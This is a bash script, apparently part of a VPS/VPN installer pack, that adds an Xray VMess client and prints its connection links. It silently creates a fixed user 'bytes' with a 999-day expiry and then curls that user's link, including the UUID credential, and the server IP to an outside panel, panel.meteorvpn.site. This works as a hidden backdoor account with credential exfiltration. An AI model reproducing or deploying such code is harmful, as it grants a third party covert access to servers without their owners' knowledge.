#!/bin/bash
# My Telegram : https://t.me/liz_mine
# ==========================================
# Color
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Getting
MYIP=$(wget -qO- ipinfo.io/ip);
source /var/lib/akbarstorevpn/ipvps.conf
domain=$(cat /etc/xray/domain)
tls="$(cat /root/log-install.txt | grep -w "XRAYS VLESS WS TLS" | cut -d: -f2|sed 's/ //g')"
nontls="$(cat /root/log-install.txt | grep -w "XRAYS VLESS WS HTTP" | cut -d: -f2|sed 's/ //g')"
until [[ $user =~ ^[a-zA-Z0-9_]+$ && ${CLIENT_EXISTS} == '0' ]]; do
		user="bytes"
		CLIENT_EXISTS=$(grep -wE "^### ${user}" "/etc/xray/config.json" | sort | uniq | cut -d ' ' -f 2 |  wc -l)

		if [[ ${CLIENT_EXISTS} -ge '1' ]]; then
			echo ""
			echo -e "Username ${RED}${user}${NC} Already On VPS Please Choose Another"
			exit 1
		fi
	done
uuid=$(cat /proc/sys/kernel/random/uuid)
masaaktif="999"
hariini=`date -d "0 days" +"%Y-%m-%d"`
exp=`date -d "$masaaktif days" +"%Y-%m-%d"`
sed -i '/#vmess$/a\### '"$user $exp"'\
},{"id": "'""$uuid""'","alterId": '"0"',"email": "'""$user""'"' /etc/xray/config.json
sed -i '/#vmessgrpc$/a\### '"$user $exp"'\
},{"id": "'""$uuid""'","alterId": '"0"',"email": "'""$user""'"' /etc/xray/config.json
cat>/etc/xray/vmess-$user-tls.json<<EOF
      {
      "v": "2",
      "ps": "${user}",
      "add": "${domain}",
      "port": "${tls}",
      "id": "${uuid}",
      "aid": "0",
      "net": "ws",
      "path": "/xrayvws",
      "type": "none",
      "host": "",
      "tls": "tls"
}
EOF
cat>/etc/xray/vmess-$user-nontls.json<<EOF
      {
      "v": "2",
      "ps": "${user}",
      "add": "${domain}",
      "port": "${nontls}",
      "id": "${uuid}",
      "aid": "0",
      "net": "ws",
      "path": "/xrayvws",
      "type": "none",
      "host": "",
      "tls": "none"
}
EOF
cat>/etc/xray/vmess-$user-grpc.json<<EOF
      {
      "v": "2",
      "ps": "${user}",
      "add": "${domain}",
      "port": "${tls}",
      "id": "${uuid}",
      "aid": "0",
      "net": "grpc",
      "path": "vmess-grpc",
      "type": "gun",
      "host": "",
      "tls": "tls"
}
EOF

## ubah config ke base64
vmess_base641=$( base64 -w 0 <<< $vmess_json1 )
vmess_base642=$( base64 -w 0 <<< $vmess_json2 )
vmess_base643=$( base64 -w 0 <<< $vmess_json3 )
xrayv2ray1="vmess://$(base64 -w 0 /etc/xray/vmess-$user-tls.json)"
xrayv2ray2="vmess://$(base64 -w 0 /etc/xray/vmess-$user-nontls.json)"
xrayv2ray3="vmess://$(base64 -w 0 /etc/xray/vmess-$user-grpc.json)"
curl -sb -X POST https://panel.meteorvpn.site/api/server/vmess -H "Content-Type: application/x-www-form-urlencoded" -d "vmess=$(base64 -w 0 /etc/xray/vmess-$user-tls.json)&ip=$MYIP"
systemctl restart xray.service
systemctl restart xray
service cron restart
clear
echo -e ""
echo -e "======-XRAYS/VMESS-======"
echo -e "Remarks     : ${user}"
echo -e "IP/Host     : ${MYIP}"
echo -e "Address     : ${domain}"
echo -e "Port TLS    : ${tls}"
echo -e "Port No TLS : ${nontls}"
echo -e "User ID     : ${uuid}"
echo -e "Alter ID    : 0"
echo -e "Security    : auto"
echo -e "Network     : ws"
echo -e "Path        : /xrayvws"
echo -e "Path GRPC   : vmess-grpc"
echo -e "Created     : $hariini"
echo -e "Expired     : $exp"
echo -e "========================="
echo -e "Link TLS    : ${xrayv2ray1}"
echo -e "========================="
echo -e "Link No TLS : ${xrayv2ray2}"
echo -e "========================="
echo -e "Link GRPC   : ${xrayv2ray3}"
echo -e "========================="
echo -e "Script Mod By LIZ"